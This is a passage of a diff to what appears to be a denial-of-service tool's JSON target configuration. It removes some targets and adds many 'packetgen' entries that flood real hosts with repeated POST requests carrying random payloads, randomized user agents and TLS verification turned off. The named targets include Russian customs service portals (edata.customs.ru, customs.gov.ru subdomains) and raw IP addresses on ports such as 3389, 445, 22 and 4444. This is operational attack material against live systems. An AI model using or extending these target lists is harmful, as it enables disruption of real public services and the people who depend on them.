-                                "Referer": "http://91.233.82.83",
-                                "X-Forwarded-Host": "91.233.82.83",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://91.233.82.81",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.233.82.81:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.233.82.81",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.233.82.81",
-                                "Referer": "http://91.233.82.81",
-                                "X-Forwarded-Host": "91.233.82.81",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "http://zv.sps-holding.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "zv.sps-holding.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://zv.sps-holding.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://zv.sps-holding.ru",
-                                "Referer": "http://zv.sps-holding.ru",
-                                "X-Forwarded-Host": "zv.sps-holding.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 11,
-            "name": "https://kandidat.krasnoe-beloe.ru/login",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "kandidat.krasnoe-beloe.ru:443",
+                        "address": "web02.edata.customs.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -2050,7 +1507,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://kandidat.krasnoe-beloe.ru/login",
+                            "path": "https://web02.edata.customs.ru/FtsPersonalCabinetWeb2017/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -2063,12 +1520,1094 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://kandidat.krasnoe-beloe.ru/login",
-                                "Referer": "https://kandidat.krasnoe-beloe.ru/login",
-                                "X-Forwarded-Host": "kandidat.krasnoe-beloe.ru",
+                                "Origin": "https://web02.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web02.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web02.edata.customs.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://95.163.65.50",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.65.50:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://95.163.65.50",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://95.163.65.50",
+                                "Referer": "http://95.163.65.50",
+                                "X-Forwarded-Host": "95.163.65.50",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.55:4444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.55:4444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web2.edata.customs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web2.edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web2.edata.customs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web2.edata.customs.ru",
+                                "Referer": "https://web2.edata.customs.ru",
+                                "X-Forwarded-Host": "web2.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:3389",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:3389"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://89.208.225.13:139",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "89.208.225.13:139"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.165:4445",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.165:4445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://vks.customs.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vks.customs.gov.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://vks.customs.gov.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://vks.customs.gov.ru",
+                                "Referer": "http://vks.customs.gov.ru",
+                                "X-Forwarded-Host": "vks.customs.gov.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49154",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:49154"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web4.edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web4.edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web4.edata.customs.ru/FtsDataSetWeb/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web4.edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://web4.edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "web4.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.163.64.157:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.64.157:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web03.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web03.edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web03.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web03.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web03.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web03.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://95.163.65.62",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.65.62:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://95.163.65.62",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://95.163.65.62",
+                                "Referer": "https://95.163.65.62",
+                                "X-Forwarded-Host": "95.163.65.62",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:445",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://edata.customs.ru/FtsDataSetWeb/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://edata.customs.ru/FtsDataSetWeb/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://edata.customs.ru/FtsDataSetWeb/",
+                                "Referer": "https://edata.customs.ru/FtsDataSetWeb/",
+                                "X-Forwarded-Host": "edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://89.208.226.166",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "89.208.226.166:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://89.208.226.166",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://89.208.226.166",
+                                "Referer": "http://89.208.226.166",
+                                "X-Forwarded-Host": "89.208.226.166",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.39:4444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.39:4444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.167:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.167:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.163.64.237:1723",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.64.237:1723"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web01.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web01.edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web01.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web01.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "Referer": "https://web01.edata.customs.ru/FtsPersonalCabinetWeb2017/",
+                                "X-Forwarded-Host": "web01.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.55:5101",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.55:5101"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://89.208.225.13:3389",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "89.208.225.13:3389"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://web02.edata.customs.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web02.edata.customs.gov.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://web02.edata.customs.gov.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://web02.edata.customs.gov.ru",
+                                "Referer": "http://web02.edata.customs.gov.ru",
+                                "X-Forwarded-Host": "web02.edata.customs.gov.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49161",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:49161"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://stat.customs.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "stat.customs.gov.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://stat.customs.gov.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://stat.customs.gov.ru",
+                                "Referer": "http://stat.customs.gov.ru",
+                                "X-Forwarded-Host": "stat.customs.gov.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.7:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.7:1720"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49157",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:49157"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.163.65.62:21",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.65.62:21"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.55:4445",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.55:4445"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://92.124.222.26:49158",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "92.124.222.26:49158"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "https://web03.edata.customs.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web03.edata.customs.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://web03.edata.customs.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://web03.edata.customs.ru",
+                                "Referer": "https://web03.edata.customs.ru",
+                                "X-Forwarded-Host": "web03.edata.customs.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.39:5100",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.39:5100"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://89.208.225.13:135",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "89.208.225.13:135"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.173.158.249:8008",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.173.158.249:8008"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.163.64.237:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.163.64.237:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://web3.edata.customs.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "web3.edata.customs.gov.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://web3.edata.customs.gov.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://web3.edata.customs.gov.ru",
+                                "Referer": "http://web3.edata.customs.gov.ru",
+                                "X-Forwarded-Host": "web3.edata.customs.gov.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://95.167.108.106:49156",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "95.167.108.106:49156"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "tcp://77.108.76.52:5101",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.108.76.52:5101"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
